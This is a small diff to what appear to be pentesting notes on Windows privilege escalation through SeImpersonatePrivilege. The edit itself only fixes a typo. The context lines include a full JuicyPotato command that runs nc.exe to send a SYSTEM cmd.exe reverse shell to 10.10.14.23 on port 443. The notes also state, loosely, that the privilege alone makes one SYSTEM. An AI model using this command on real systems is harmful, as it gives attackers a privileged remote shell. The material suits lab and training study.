@@ -24,6 +24,6 @@ Priviledge exploitation
 
 ### Some priviledges if enables to exploit
     1) SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
-       If this is Enables then you are the SYSTEM.
+       If this is Enabled then you are the SYSTEM.
        List of CLDIS
        juicypotato.exe -l 1234 -p nc.exe -a "-e cmd.exe 10.10.14.23 443" -t * -c {8BC3F05E-D86B-11D0-A075-00C04FB68820}
